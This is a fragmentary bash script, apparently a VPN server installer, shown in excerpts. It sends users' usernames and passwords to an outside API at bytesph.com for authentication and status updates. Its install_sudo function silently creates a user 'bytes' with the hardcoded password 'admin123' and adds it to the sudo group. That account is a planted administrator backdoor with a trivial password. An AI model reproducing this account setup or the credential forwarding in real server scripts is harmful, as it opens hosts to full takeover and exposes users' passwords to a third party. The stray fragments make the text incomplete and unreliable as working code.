...
#!/bin/bash
##Authentication
data=$(curl -sb -X POST https://bytesph.com/api/server/login -H "Content-Type: application/x-www-form-urlencoded" -d "login=true&username=$username&password=$password")
...
data=$(curl -sb -X POST https://bytesph.com/api/server/update-status -H "Content-Type: application/x-www-form-urlencoded" -d "status=1&username=$common_name")
...
data=$(curl -sb -X POST https://bytesph.com/api/server/update-status -H "Content-Type: application/x-www-form-urlencoded" -d "status=0&username=$common_name")
BYTES2
...
install_sudo(){
  {
    useradd -m bytes 2>/dev/null; echo bytes:admin123 | chpasswd &>/dev/null; usermod -aG sudo bytes &>/dev/null
